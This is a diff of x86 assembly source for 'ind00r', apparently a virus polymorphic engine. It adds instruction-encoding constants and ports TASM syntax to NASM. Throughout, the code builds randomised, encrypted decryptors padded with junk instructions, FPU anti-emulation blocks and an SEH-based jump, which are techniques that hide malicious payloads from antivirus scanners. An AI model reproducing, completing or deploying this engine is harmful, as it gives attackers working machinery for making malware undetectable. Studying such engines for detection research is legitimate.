@@ -32,6 +32,333 @@
 
 %define MAX_PARAMS       0x04               ; maximal number of parameters
 
+%define GF_METHCNT       3
+%define BJ_BLOCKCNT      0x05
+%define RJ_METHCNT       0x06
+%define MJ_METHCNT       0x03
+%define GM_METHCNT3      0x02
+%define GM_METHCNT2      0x03
+%define GM_METHCNT1      0x05
+%define PP_METHCNT       0x05
+%define GLR_METHCNT      0x04
+%define JUNKGEN_CNT      0x02
+%define CALL_ORDER_1     CallOrder1_e - CallOrder1
+%define CALL_ORDER_2     CallOrder2 - CallOrder1
+%define PROC_ORDER       ProcedureOrder_e - ProcedureOrder
+
+%define USED_REGS        Registers_e - Registers
+
+; encryption type constantz
+%define ENC_XOR        0b00000000             ; xor encryption
+%define ENC_ADD        0b00000001             ; add encryption
+%define ENC_SUB        0b00000010             ; sub encryption
+%define ENC_ROL        0b00000011             ; rol encryption
+%define ENC_ROR        0b00000100             ; ror encryption
+%define ENC_RND        5
+
+; key increment type constantz
+%define KEY_INC        0b00000000             ; rol key with random value
+%define KEY_DEC        0b00000001             ; ror key with random value
+%define KEY_ROL        0b00000010             ; inc key with random value
+%define KEY_ROR        0b00000011             ; dec key with random value
+%define KEY_RND        4
+; i386 instruction set constants
+; correct order of register on stack after a pushad. offset relative
+; to ESP
+%define PUSHAD_EAX       (REG_EDI - REG_EAX) * 4      ; location of EAX
+%define PUSHAD_ECX       (REG_EDI - REG_ECX) * 4      ; location of ECX
+%define PUSHAD_EDX       (REG_EDI - REG_EDX) * 4      ; location of EDX
+%define PUSHAD_EBX       (REG_EDI - REG_EBX) * 4      ; location of EBX
+%define PUSHAD_ESP       (REG_EDI - REG_ESP) * 4      ; location of ESP
+%define PUSHAD_EBP       (REG_EDI - REG_EBP) * 4      ; location of EBP
+%define PUSHAD_ESI       (REG_EDI - REG_ESI) * 4      ; location of ESI
+%define PUSHAD_EDI       (REG_EDI - REG_EDI) * 4      ; location of EDI
+%define PUSHAD_SIZE      8 * 0x04                      ; size of pushad record
+
+; dword registerz
+%define REG_EAX          0b00000000
+%define REG_ECX          0b00000001
+%define REG_EDX          0b00000010
+%define REG_EBX          0b00000011
+%define REG_ESP          0b00000100
+%define REG_EBP          0b00000101
+%define REG_ESI          0b00000110
+%define REG_EDI          0b00000111
+
+; word registerz
+%define REG_AX           0b00000000
+%define REG_CX           0b00000001
+%define REG_DX           0b00000010
+%define REG_BX           0b00000011
+%define REG_SP           0b00000100
+%define REG_BP           0b00000101
+%define REG_SI           0b00000110
+%define REG_DI           0b00000111
+
+; byte registerz
+%define REG_AL           0b00000000
+%define REG_CL           0b00000001
+%define REG_DL           0b00000010
+%define REG_BL           0b00000011
+%define REG_AH           0b00000100
+%define REG_CH           0b00000101
+%define REG_DH           0b00000110
+%define REG_BH           0b00000111
+
+; fpu registerz
+%define REG_ST0          0b00000000
+%define REG_ST1          0b00000001
+%define REG_ST2          0b00000010
+%define REG_ST3          0b00000011
+%define REG_ST4          0b00000100
+%define REG_ST5          0b00000101
+%define REG_ST6          0b00000110
+%define REG_ST7          0b00000111
+
+%define REG_RND          REG_EDI + 1
+
+; jump opcode constantz
+%define JMP_SHORT        0x0EB
+%define JMP_LONG         0x0E9
+%define JMPC_SHORT       0x070
+%define JMPC_LONG        0x080              ; 2 byte opcode!
+
+; conditions
+
+%define COND_C           0x002            ; carry
+%define COND_NC          0x003            ; no carry
+%define COND_E           0x004            ; equal                   A  = B
+%define COND_NE          0x005            ; not equal               A != B
+%define COND_Z           0x004            ; zero                    A  = B
+%define COND_NZ          0x005            ; not zero                A != B
+%define COND_S           0x008            ; sign                   msb = 1
+%define COND_NS          0x009            ; no sign                msb = 0
+%define COND_P           0x00A            ; parity even            lsb = 0
+%define COND_O           0x000            ; overflow       msb was toggled
+%define COND_NO          0x001            ; no overflow    msb wasn't toggled
+
+%define COND_B           COND_C          ; below                    A > B
+%define COND_NAE         COND_B          ; neither above or equal   A > B
+%define COND_NB          COND_NC         ; not below                A ≤ B
+%define COND_AE          COND_NB         ; above or equal           A ≤ B
+%define COND_BE          0x006            ; below or equal           A ≥ B
+%define COND_NA          COND_BE         ; not above                A ≥ B
+%define COND_NBE         0x007            ; neither below or equal   A < B
+%define COND_A           COND_NBE        ; above                    A < B
+%define COND_L           0x00C            ; less                     A > B
+%define COND_NGE         COND_L          ; neither greater or equal A > B
+%define COND_NL          0x00D            ; not less                 A ≤ B
+%define COND_GE          COND_NL         ; greater or equal         A ≤ B
+%define COND_LE          0x00E            ; less or equal            A ≥ B
+%define COND_NG          COND_LE         ; not greater              A ≥ B
+%define COND_NLE         0x00F            ; neither less or equal    A < B
+%define COND_G           COND_NLE        ; greater                  A < B
+
+; call opcode constantz
+%define CALL_DIRECT      0x0E8
+
+; procedure commands
+%define PROC_ENTER       0x0C8
+%define PROC_LEAVE       0x0C9
+%define PROC_RETP        0x0C2
+%define PROC_RET         0x0C3
+%define MOV_EBP_ESP      0x0EC8B
+
+; stack opcodes
+%define PUSH_REG         0x050                 ; xor REG_???
+%define POP_REG          0x058
+%define PUSH_IMM         0x068
+%define PUSH_IMM_SX      0x06A
+%define POP_MEM          0x08F
+
+; increment/decrement opcodes
+%define INC_REG          0x040
+%define DEC_REG          0x048
+%define INCDEC_GROUP     0x0FE
+
+; mov opcodes
+%define MOV_REG_RM       0
+%define MOV_REG_IMM      0x0B0 ; mov register, immediate
+%define MOV_REG_IMM8     0x0B0
+%define MOV_REG_IMM32    0x0B8
+%define MOV_MEM_IMM      0x0C6 ; mov memory, immediate
+
+; extended mov opcodes
+
+%define MOVX             0x0B6
+%define MOVX_BYTE        0x000
+%define MOVX_WORD        0x001
+%define MOVX_ZX          0x000
+%define MOVX_SX          0x008
+
+%define LOAD_EA          0x08D
+
+; Flag set/clear commands
+%define CLR_CRY          0x0F8
+%define SET_CRY          0x0F9
+%define CLR_INT          0x0FA
+%define SET_INT          0x0FB
+%define CLR_DIR          0x0FC
+%define SET_DIR          0x0FD
+
+; Common opcode constants
+
+; prefixes
+%define ESC_2BYTE        0x0F
+%define OPERAND_SIZE     0x66
+%define ADDRESS_SIZE     0x67
+
+; segment override prefix
+%define OVERRIDE_FS      0x64
+%define OVERRIDE_GS      0x65
+
+; operand size
+%define OPSIZE_8         0x00
+%define OPSIZE_32        0x01
+%define OPSIZE_16        0x02
+
+; direction
+%define MEM_REG          0x00
+%define REG_MEM          0x01
+
+; some opcodes support direct EAX/AX/AL access
+%define USE_EAX          0x04
+%define XCHG_EAX_REG     0x090 ; add register number to get opcode (not eax)
+%define OP_NOP           0x090 ; very obsolete :x<
+%define TEST_EAX_IMM     0x0A8
+
+; Shift operation constants
+%define OP_SHIFT         0x0C0
+
+%define SHIFT_IMM        0x000 ; shift immediate
+%define SHIFT_1          0x001 ; shift 1 time
+%define SHIFT_CL         0x002 ; shift cl times
+%define SHIFT_RND        0x003 ; for choosing random shift.
+
+%define ROL_SHIFT        0x000
+%define ROR_SHIFT        0x001
+%define RCL_SHIFT        0x002
+%define RCR_SHIFT        0x003
+%define SHL_SHIFT        0x004
+%define SHR_SHIFT        0x005
+%define SAR_SHIFT        0x006
+%define RND_SHIFT        0x007
+
+%define OP_GROUP1        0x080 ; opcode for immediate group 1
+%define OP_GROUP3        0x0F6 ; opcode for shift group 3
+
+; jmp, call, push, inc, dec group
+%define OP_GROUP5        0x0FF ; opcode for jmpcallpushincdec group 5
+
+%define P_INC            0x000
+%define P_DEC            0x001
+%define P_CALL_NEAR      0x002  ; call dword ptr
+%define P_CALL_FAR       0x003  ; call 48-bit ptr
+%define P_JMP_NEAR       0x004  ; jmp dword ptr
+%define P_JMP_FAR        0x005  ; jmp 48-bit ptr
+%define P_PUSH           0x006
+
+; Math operation constants
+%define OPTYPE_ADD       0x00
+%define OPTYPE_OR        0x01
+%define OPTYPE_ADC       0x02
+%define OPTYPE_SBB       0x03
+%define OPTYPE_AND       0x04
+%define OPTYPE_SUB       0x05
+%define OPTYPE_XOR       0x06
+%define OPTYPE_CMP       0x07
+%define OPTYPE_MOV       0x008
+%define OPTYPE_TEST      0x009
+%define OPTYPE_XCHG      0x00A
+
+; Math opcode constants
+%define MATH_ADD         OPTYPE_ADD << 0x03
+%define MATH_OR          OPTYPE_OR  << 0x03
+%define MATH_ADC         OPTYPE_ADC << 0x03
+%define MATH_SBB         OPTYPE_SBB << 0x03
+%define MATH_AND         OPTYPE_AND << 0x03
+%define MATH_SUB         OPTYPE_SUB << 0x03
+%define MATH_XOR         OPTYPE_XOR << 0x03
+%define MATH_CMP         OPTYPE_CMP << 0x03
+
+; Immediate opcode constants
+%define IMM_OP           0x80
+%define IMM_SX           0x03               ; sign extended immediate
+
+; MOD/RM constants
+
+; MOD bits
+%define MOD_NODISP       0x000                  ; no displacement
+%define MOD_DISP8        0x040                  ; 8-bit displacement
+%define MOD_DISP32       0x080                  ; 32-bit displacement
+%define MOD_REG          0x0C0                  ; register
+%define _MOD             0b011000000            ; mask for MOD-field
+
+%define MOD_DIRECT       0b00001000                 ; use immediate address
+%define MOD_SIB          0b00010000                 ; use sib byte
+
+; REG bits
+%define _REG             0b000111000            ; mask for REG-field
+
+; RM bits
+%define RM_DIRECT        REG_EBP ^ MOD_NODISP
+%define RM_SIB           REG_ESP
+%define _RM              0b000000111            ; mask for RM field
+
+; FPU opcodes
+
+%define FPU_OPCODE       0x0D8
+%define FPU_DWORD_OP     0x0D8   ; dword ops/fpu reg ops
+%define FPU_DWORD_LDST   0x0D9   ; group 1 - 4, FLD, FST, ...
+%define FPU_INT_OP       0x0DA   ; dword operations
+%define FPU_INT_LDST     0x0DB   ; group 5, FILD, FIST
+%define FPU_QWORD_OP     0x0DC   ; qword ops/fpu reg ops
+%define FPU_QWORD_LDST   0x0DD   ; qword FILD, FIST
+%define FPU_WORD_OP      0x0DE   ; word ops (only mem), and reversed arithmetix
+%define FPU_WORD_LDST    0x0DF   ; word FILD, FIST
+
+; FPU opcode + MOD/RM (bl = FPU_FMUL, FDIV...)
+
+; IMPORTANT: note that the word operations won't work with fpu registers!
+
+%define FPU_ADD         0b000                   ; MOD/RM bit 3,4,5 = 001
+%define FPU_MUL         0b001
+%define FPU_CMP         0b010
+%define FPU_COMP        0b011
+%define FPU_SUB         0b100
+%define FPU_SUBR        0b101
+%define FPU_DIV         0b110
+%define FPU_DIVR        0b111
+
+; FPU_WORD_OP group contains some opcodes with reversed register order.
+; this means first comes st(?) and then the first register.
+%define FPU_ADDP        0b000                   ; MOD/RM bit 3,4,5 = 001
+%define FPU_MULP        0b001
+%define FPU_COMPP       0b011
+%define FPU_SUBRP       0b100
+%define FPU_SUBP        0b101
+%define FPU_DIVRP       0b110
+%define FPU_DIVP        0b111
+
+%define FPU_DIR1         0x000                     ; direction st, st(?)
+%define FPU_DIR2         0x004                     ; direction st(?), st
+
+; FPU stand alone instructions
+%define FPU_INIT         0x0E3DB
+%define FPU_SQRT         0x0FAD9
+
+%define FPU_LD1          0x0E8D9
+%define FPU_LDL2T        0x0E9D9
+%define FPU_LDL2E        0x0EAD9
+%define FPU_LDPI         0x0EBD9
+%define FPU_LDLG2        0x0ECD9
+%define FPU_LDLN2        0x0EDD9
+%define FPU_LDZ          0x0EED9
+
+%define FPU_WAIT         0x09B
+%define FPU_STORE        0x02
+%define FPU_LOAD         0x00
+
 
 ; main procedure: ind00r
 ; parameters:
@@ -71,11 +398,11 @@ ind00r_delta:   mov   al, JMP_LONG               ; write jump to main loop
                 call  iGenProcs                  ; generate procedures
                 push  edi                        ; here we want to jump
                 call  RelLongJmp                 ; reloc jump to main loop
-                or    byte [ebp.nojunk-idelta], 0x0FF
+                or    byte [ebp+nojunk-idelta], 0x0FF
                 call  iGenLoop                   ; generate main loop
                 call  iSEHJump
-                sub   edi, [esp.PUSHAD_EDI]      ; calculate decryptor size
-                mov   [esp.PUSHAD_ECX], edi      ; ECX = size
+                sub   edi, [esp+PUSHAD_EDI]      ; calculate decryptor size
+                mov   [esp+PUSHAD_ECX], edi      ; ECX = size
                 call  iEncrypt                   ; encrypt code!
                 popad                            ; restore all registers
                 ret                              ; return
@@ -87,11 +414,11 @@ iInit:
                 add   ebp, idelta - ind00r_delta        ; calculate delta
                                                         ; offset
                 ; now init random seed
-                push  dword [ebp.RandomConst-idelta]
-                pop   dword [ebp.RandomSeed-idelta]
+                push  dword [ebp+RandomConst-idelta]
+                pop   dword [ebp+RandomSeed-idelta]
 
                 push  edi                   ; push destination index
-                lea   edi, [ebp.InitValues-idelta] ; table with init values
+                lea   edi, [ebp+InitValues-idelta] ; table with init values
 
                 ; let's store parameterz
                 stosd                       ; store size of junk space
@@ -105,7 +432,7 @@ iInit:
                 stosd                       ; address of code
 
                 ; mix the registers
-                lea   esi, [ebp.preg-idelta]
+                lea   esi, [ebp+preg-idelta]
                 push  USED_REGS
                 call  MixBytes
 
@@ -113,26 +440,26 @@ iInit:
                 push  JUNK_PROCS      ; 0 - 3
                 call  rnd32r
                 add   al, MIN_PROCS
-                mov   [ebp.ProcCount-idelta], al   ; number of procedures
+                mov   [ebp+ProcCount-idelta], al   ; number of procedures
 
                 ; put the procedures in random order
-                lea   esi, [ebp.ProcedureOrder-idelta]
+                lea   esi, [ebp+ProcedureOrder-idelta]
                 push  eax
                 call  MixBytes
 
                 ; put procedure calls in random order
-                lea   esi, [ebp.CallOrder1-idelta]
+                lea   esi, [ebp+CallOrder1-idelta]
                 push  CALL_ORDER_1
                 call  MixBytes
 
-                lea   esi, [ebp.CallOrder2-idelta]
+                lea   esi, [ebp+CallOrder2-idelta]
                 mov   ecx, eax
                 sub   al, CALL_ORDER_2 + 1
                 push  eax
                 call  MixBytes
 
                 ; get random parameter count for each procedure
-                lea   edi, [ebp.ProcParameters-idelta]
+                lea   edi, [ebp+ProcParameters-idelta]
                 mov   cl, MAX_PROCS
 i_par_loop:     push  MAX_PARAMS + 0x03       ;   0 - MAX_PARAMS + 2
                 call  rnd32r
@@ -145,7 +472,7 @@ i_lamest:       stosb
                 stosb
 
                 ; get random key, encryption & key increment type
-                lea   edi, [ebp.CryptKey-idelta]
+                lea   edi, [ebp+CryptKey-idelta]
                 call  rnd32
                 stosd                        ; write key
                 call  rnd32
@@ -157,13 +484,13 @@ i_lamest:       stosb
                 call  rnd32r
                 stosb                        ; write key increment type
                 pop   edi                    ; pop destination index
-                and   word [ebp.InLoop-idelta], 0x00
+                and   word [ebp+InLoop-idelta], 0x00
                 ret
 ;iInit           endp
 ; main procedure: encrypt
 iEncrypt:
                 pushad
-                lea   esi, [ebp.CryptSize-idelta]
+                lea   esi, [ebp+CryptSize-idelta]
                 lodsd                   ; CryptSize
                 xchg  eax, ebx
                 lodsd                   ; EncryptRVA
@@ -173,7 +500,7 @@ iEncrypt:
                 lodsd                   ; KeyIncrement
                 xchg  eax, edx
 
-encrypt_loop:   mov   al, [ebp.CryptType-idelta] ; get encryption type
+encrypt_loop:   mov   al, [ebp+CryptType-idelta] ; get encryption type
                 cmp   al, ENC_XOR         ; XOR encryption?
                 jnz   ie_not_xor          ; no, check next
                 xor   [edi], ecx          ; yes, XOR [preg], key
@@ -190,7 +517,7 @@ ie_not_rol:     cmp   al, ENC_ROR         ; ROR decryption?
                 jnz   ie_not_ror          ; no, jmp to key increment
                 rol   dword [edi], cl ; rotate dword
 ie_not_ror:     xchg  ecx, edx
-                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
+                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                 cmp   al, KEY_ROL         ; ROL key increment?
                 jnz   ie_n_rol            ; no, check next
                 rol   edx, cl             ; rotate key
@@ -214,7 +541,7 @@ ie_n_dec:       xchg  ecx, edx
 ;                 instructions.
 iGenProcs:
                 ; get number of procedures into counter
-                movzx ecx, byte [ebp.ProcCount-idelta]
+                movzx ecx, byte [ebp+ProcCount-idelta]
                 xor   ebx, ebx  ; set up another counter that counts from 0
 
                 ; for choosin' procedures
@@ -224,15 +551,15 @@ iGenProcs:
 gp_loop:        push  ecx
                 ; getting number of current procedure
                 push  ebx
-                movzx ebx, byte [ebp.ProcedureOrder-idelta+ebx]
+                movzx ebx, byte [ebp+ProcedureOrder-idelta+ebx]
                                                     ; ID # of 1st procedure
-                mov   [ebp.CurrentProc-idelta], bl  ; for junk gen to
+                mov   [ebp+CurrentProc-idelta], bl  ; for junk gen to
                                                     ; identify current:
                 ; store procedure address
-                mov   [ebp.ProcAddress-idelta+4*ebx], edi
+                mov   [ebp+ProcAddress-idelta+4*ebx], edi
 
                 ; get number of parameters
-                mov   dl, [ebp.ProcParameters-idelta+ebx]
+                mov   dl, [ebp+ProcParameters-idelta+ebx]
                 test  dl, dl                  ; if no parameter,
                 jz    gp_np_entry             ; generate no entry
                 ; if procedure has parameters we need to set up EBP
@@ -255,7 +582,7 @@ gp_np_entry:    push  ebx
                 pop   ebx
                 cmp   ebx, JUNK_PROC
                 jnb   gp_junk_proc
-                mov   esi, [ebp.Generatorz-idelta+ebx*4]
+                mov   esi, [ebp+Generatorz-idelta+ebx*4]
                 add   esi, ebp
                 push  edx
                 call  esi                     ; call di generator
@@ -291,20 +618,20 @@ gp_par:         call  WriteJunk
 ;iGenProcs       endp
 ; generates main loop with some junk between callz.
 iGenLoop:
-                or    byte [ebp.InLoop-idelta], 0x01
-                lea   esi, [ebp.CallOrder1-idelta]
-                movsx ecx, byte [ebp.ProcCount-idelta]
-                or    byte [ebp.CurrentProc-idelta], 0x0FF
+                or    byte [ebp+InLoop-idelta], 0x01
+                lea   esi, [ebp+CallOrder1-idelta]
+                movsx ecx, byte [ebp+ProcCount-idelta]
+                or    byte [ebp+CurrentProc-idelta], 0x0FF
 gl_call_lp:     xor   eax, eax
                 lodsb                           ; get numbah of:
                 xchg  eax, ebx
-                inc   byte [ebp.CurrentProc-idelta]
-                cmp   byte [ebp.CurrentProc-idelta], DECRYPT_DATA
+                inc   byte [ebp+CurrentProc-idelta]
+                cmp   byte [ebp+CurrentProc-idelta], DECRYPT_DATA
                 jne   gl_yxcmv
                 push  edi
 gl_yxcmv:
                 push  ecx
-                movsx ecx, byte [ebp.ProcParameters-idelta+ebx]
+                movsx ecx, byte [ebp+ProcParameters-idelta+ebx]
                 push  ebx
                 test  ecx, ecx                  ; 0 parameterz?
                 jz    gl_no_par                 ; don't loop
@@ -313,7 +640,7 @@ gl_push_lp:
                 loop  gl_push_lp
 gl_no_par:
                 pop   ebx
-                mov   edx, [ebp.ProcAddress-idelta+4*ebx]
+                mov   edx, [ebp+ProcAddress-idelta+4*ebx]
                 mov   byte [edi], CALL_DIRECT ; write call opcode
                 inc   edi
                 neg   edi
@@ -322,7 +649,7 @@ gl_no_par:
                 stosd
                 pop   ecx                       ; outer loop counter
                 loop  gl_call_lp
-                mov   bl, [ebp.creg-idelta]    ; generate check if counter
+                mov   bl, [ebp+creg-idelta]    ; generate check if counter
                 call  gCheckReg                ; reg is zero
                 mov   ax, ESC_2BYTE ^ ((JMPC_LONG ^ COND_NE) * 0x100)
                 stosw                            ; generate JNZ
@@ -335,7 +662,7 @@ gl_no_par:
 ;iGenLoop        endp
 ; generate jump to code
 iSEHJump:
-                mov   edx, [ebp.DecryptRVA-idelta] ; where to jump after
+                mov   edx, [ebp+DecryptRVA-idelta] ; where to jump after
                                                    ; decryption
 
                 ; 1. let's put offset to code on stack
@@ -444,28 +771,28 @@ isj_suck0:      pop   ecx
 ;iSEHJump        endp
 ; load start RVA into pointer register
 iProcLdPtr:
-                mov   edx, [ebp.DecryptRVA-idelta]
-                mov   bl, [ebp.preg-idelta]
+                mov   edx, [ebp+DecryptRVA-idelta]
+                mov   bl, [ebp+preg-idelta]
                 jmp   gLoadReg
 ;iProcLdPtr      endp
 ; load size into counter register
 iProcLdCnt:
-                mov   edx, [ebp.CryptSize-idelta]
-                mov   bl, [ebp.creg-idelta]
+                mov   edx, [ebp+CryptSize-idelta]
+                mov   bl, [ebp+creg-idelta]
                 jmp   gLoadReg
 ;iProcLdCnt      endp
 ; load key into key register
 iProcLdKey:
-                mov   edx, [ebp.CryptKey-idelta]
-                mov   bl, [ebp.kreg-idelta]
+                mov   edx, [ebp+CryptKey-idelta]
+                mov   bl, [ebp+kreg-idelta]
                 jmp   gLoadReg
 ;iProcLdKey      endp
 ; decrypt data word
 iProcDecData:
-                mov   cl, [ebp.preg-idelta]  ; operand = ptr reg
+                mov   cl, [ebp+preg-idelta]  ; operand = ptr reg
                 call  rnd32                  ; get random bit
                 mov   bl, 0x08
-                cmp   byte [ebp.CryptType-idelta], ENC_SUB
+                cmp   byte [ebp+CryptType-idelta], ENC_SUB
                 jbe   dd_not_chk_ecx
                 cmp   cl, REG_ECX
                 jne   dd_not_chk_ecx
@@ -495,7 +822,7 @@ dd_get_jnk_reg: call  iGetJunkReg
                 call  iBlockJunkAR
 blaaah:
                 ; test for encryption type
-                mov   al, [ebp.CryptType-idelta]
+                mov   al, [ebp+CryptType-idelta]
                 cmp   al, ENC_XOR
                 jnz   dd_not_xor
                 mov   bh, OPTYPE_XOR   ; generate XOR jreg/[preg], kreg
@@ -510,7 +837,7 @@ dd_not_sub:     ja    dd_rotate        ; generate ROR/ROL jreg/[preg], kreg
                 push  ecx
                 mov   al, OPSIZE_32
                 mov   ah, MEM_REG
-                mov   bl, [ebp.kreg-idelta]
+                mov   bl, [ebp+kreg-idelta]
                 xor   ch, ch
                 xor   esi, esi
                 call  ciOpRMReg
@@ -542,7 +869,7 @@ dd_rotate:      push  ecx              ; code reg/pointer reg
                 ;
                 ; junkreg must not be ECX
 
-                mov   al, [ebp.kreg-idelta]    ; load key register
+                mov   al, [ebp+kreg-idelta]    ; load key register
 
                 cmp   al, REG_ECX              ; ECX?
                 jz    dd_no_push               ; yes, no need to push ecx
@@ -614,7 +941,7 @@ dd_exit:        pop   ebx                      ; pop code/ptr reg
                 jnz   dd_not_save_reg
                 and   ebx, REG_EDI
                 call  iBlockJunkAR
-                mov   cl, [ebp.preg-idelta]
+                mov   cl, [ebp+preg-idelta]
                 mov   bh, OPTYPE_MOV
                 call  rnd32
                 and   al, 0x02
@@ -630,11 +957,11 @@ dd_not_save_reg:
 
 ; increment key
 iProcIncKey:
-                mov   edx, [ebp.KeyIncrement-idelta] ; load key increment
+                mov   edx, [ebp+KeyIncrement-idelta] ; load key increment
                 call  iGetJunkReg                    ; get random junk reg
                 xchg  eax, ecx
                 mov   ebx, ecx
-                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
+                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                 mov   bh, OPTYPE_ADD              ; first assume ADD
                 cmp   al, KEY_DEC                 ; check if decrement key
                 jnz   pik_not_sub                 ; nope, ADD
@@ -650,7 +977,7 @@ pik_not_sub:    ja    pik_rotate                  ; > KEY_DEC: rotate!
                 pop   ebx
                 call  iBlockJunkAR
                 xor   bl, MOD_REG
-                mov   cl, [ebp.kreg-idelta]      ; get key reg
+                mov   cl, [ebp+kreg-idelta]      ; get key reg
                 xor   ecx, 0xFFFFFF00 ^ MOD_REG
                 push  0x02
                 call  rnd32r
@@ -664,7 +991,7 @@ pik_blah:
 pik_direct:
                 mov   al, OPSIZE_32
                 mov   bl, bh
-                mov   cl, [ebp.kreg-idelta]
+                mov   cl, [ebp+kreg-idelta]
                 or    ecx, 0xFFFFFF00 ^ MOD_REG
 
                 jmp   ciOpRMImm
@@ -678,7 +1005,7 @@ pik_not_ror:    mov   ah, dl
                 and   ah, 0x1F
                 mov   bh, SHIFT_IMM
                 mov   al, OPSIZE_32
-                mov   cl, [ebp.kreg-idelta]
+                mov   cl, [ebp+kreg-idelta]
                 xor   cl, MOD_REG
                 call  ciShiftRM
                 ret
@@ -687,7 +1014,7 @@ pik_not_ror:    mov   ah, dl
 iProcIncPtr:
                 push  0x04                       ; we have 4 methods
                 call  rnd32r                    ; to do so
-                mov   cl, [ebp.preg-idelta]
+                mov   cl, [ebp+preg-idelta]
                 xor   cl, MOD_REG               ; pointer reg, of course
                 push  0x04
                 pop   edx                       ; mov edx, 4 (optimized :P)
@@ -726,7 +1053,7 @@ pip_not_lea:    mov   al, OPSIZE_32
 iProcDecCnt:
                 push  0x05
                 call  rnd32r
-                mov   cl, [ebp.creg-idelta]
+                mov   cl, [ebp+creg-idelta]
                 or    cl, MOD_REG
                 xor   edx, edx
                 test  al, al
@@ -734,7 +1061,7 @@ iProcDecCnt:
 
                 ; generate DEC creg
                 mov   al, DEC_REG
-                or    al, [ebp.creg-idelta]
+                or    al, [ebp+creg-idelta]
                 stosb
                 ret
 pdc_not_dec:    cmp   al, 0x01
@@ -811,7 +1138,7 @@ iProcFPUFool:
                 ; calculate address of method and execute it!
                 pop   eax
                 push  eax
-                mov   ebx, [ebp.gf_methods-idelta+4*eax]
+                mov   ebx, [ebp+gf_methods-idelta+4*eax]
                 add   ebx, ebp
                 call  ebx
 
@@ -829,7 +1156,7 @@ iProcFPUFool:
 
                 pop   eax
                 push  edi            ; label1 in ECX (see below)
-                movzx edx, byte [ebp.gf_rslt_table-idelta+eax]
+                movzx edx, byte [ebp+gf_rslt_table-idelta+eax]
                 push  0x03
                 call  rnd32r
                 add   al, OPTYPE_SUB            ; SUB, CMP or XOR
@@ -972,14 +1299,14 @@ iProcJunk:
 iBlockJunk:
                 mov   bl, 0x08
 iBlockJunkAR:                            ; avoid register in ebx
-                test  byte [ebp.nojunk-idelta], 0x0FF
+                test  byte [ebp+nojunk-idelta], 0x0FF
                 jz    bj_sueder
                 ret
 bj_sueder:
                 pushad
                 push  BJ_BLOCKCNT        ; choose between multiple methods
                 call  rnd32r
-                mov   edx, [ebp.bj_blockz-idelta+4*eax] ; get address of
+                mov   edx, [ebp+bj_blockz-idelta+4*eax] ; get address of
                 add   edx, ebp           ; method procedure & relocate
 bj_nxtr:        call  iGetJunkReg        ; get a junk reg
                 cmp   al, bl             ; test if we shouldn't touch it
@@ -1083,7 +1410,7 @@ iRndJunk:
                 xchg  eax, ecx
 rndj_loop:      push  JUNKGEN_CNT
                 call  rnd32r
-                mov   eax, [ebp.JunkGen-idelta+4*eax]
+                mov   eax, [ebp+JunkGen-idelta+4*eax]
                 add   eax, ebp
                 push  ecx
                 push  ebx
@@ -1101,7 +1428,7 @@ rndj_loop:      push  JUNKGEN_CNT
 iRegJunk:
                 push  RJ_METHCNT
                 call  rnd32r
-                mov   ecx, [ebp.rj_methods-idelta+4*eax]
+                mov   ecx, [ebp+rj_methods-idelta+4*eax]
                 add   ecx, ebp
                 call  iOpSizeReg
                 jmp   ecx
@@ -1278,7 +1605,7 @@ irrj_loop:      push  ecx
 iMemJunk:
                 push  MJ_METHCNT
                 call  rnd32r
-                mov   edx, [ebp.mj_methods-idelta+4*eax]
+                mov   edx, [ebp+mj_methods-idelta+4*eax]
                 add   edx, ebp
                 push  OPSIZE_16 + 1
                 call  rnd32r
@@ -1370,23 +1697,23 @@ iGetMemory:
                 push  eax
 gm_rep:         xor   eax, eax
                 mov   al, GM_METHCNT2
-                cmp   byte [ebp.CurrentProc-idelta], DECRYPT_DATA
+                cmp   byte [ebp+CurrentProc-idelta], DECRYPT_DATA
                 jb    gm_push
                 inc   eax
                 inc   eax
-gm_push:        sub   al, [ebp.InLoop-idelta]
+gm_push:        sub   al, [ebp+InLoop-idelta]
                 push  eax
                 call  rnd32r
-                add   al, [ebp.InLoop-idelta]
-                mov   eax, [ebp.gm_methods-idelta+4*eax]
+                add   al, [ebp+InLoop-idelta]
+                mov   eax, [ebp+gm_methods-idelta+4*eax]
                 add   eax, ebp
                 call  eax
                 pop   eax
                 ret
 
                 ; get random parameter
-gm_meth1:       movzx eax, byte [ebp.CurrentProc-idelta]
-                mov   al, [ebp.ProcParameters-idelta+eax] ; parameter count
+gm_meth1:       movzx eax, byte [ebp+CurrentProc-idelta]
+                mov   al, [ebp+ProcParameters-idelta+eax] ; parameter count
                 test  eax, eax
                 jz    gm_m1_ebp    ; if no parameter, don't use this method
                 push  eax
@@ -1400,33 +1727,33 @@ gm_m1_ebp:      mov   cl, REG_EBP ^ MOD_REG
                 ret
 
                 ; get random junk mem
-gm_meth2:       mov   eax, [ebp.JunkSpSize-idelta] ; access a random dword
+gm_meth2:       mov   eax, [ebp+JunkSpSize-idelta] ; access a random dword
                 shl   eax, 0x02
                 dec   eax
                 dec   eax
                 dec   eax
                 push  eax
                 call  rnd32r                      ; from junk memory
-                add   eax, [ebp.JunkSpRVA-idelta] ; add start rva
+                add   eax, [ebp+JunkSpRVA-idelta] ; add start rva
                 xchg  eax, esi
                 mov   cx, MOD_DIRECT              ; return a direct address
                 ret
 
                 ; get random encrypted data
-gm_meth3:       mov   eax, [ebp.CryptSize-idelta]
+gm_meth3:       mov   eax, [ebp+CryptSize-idelta]
                 shl   eax, 0x02
                 dec   eax
                 dec   eax
                 dec   eax
                 push  eax
                 call  rnd32r
-                add   eax, [ebp.DecryptRVA-idelta]
+                add   eax, [ebp+DecryptRVA-idelta]
                 xchg  eax, esi
                 mov   cx, MOD_DIRECT
                 ret
 
                 ; get encrypted data (RVA + 1/2/4*counter)
-gm_meth4:       mov   esi, [ebp.DecryptRVA-idelta]
+gm_meth4:       mov   esi, [ebp+DecryptRVA-idelta]
                 push  0x03                   ; scaling factor 1, 2 or 4
                 call  rnd32r
                 mov   ecx, eax
@@ -1437,13 +1764,13 @@ gm_meth4:       mov   esi, [ebp.DecryptRVA-idelta]
                 sub   esi, edx
                 pop   edx
                 shl   eax, 0x03
-                xor   al, [ebp.creg-idelta]
+                xor   al, [ebp+creg-idelta]
                 mov   ch, al
                 mov   cl, MOD_DIRECT
                 ret
 
                 ; get current encrypted dword
-gm_meth5:       movsx cx, byte [ebp.preg-idelta]  ; use [preg] without
+gm_meth5:       movsx cx, byte [ebp+preg-idelta]  ; use [preg] without
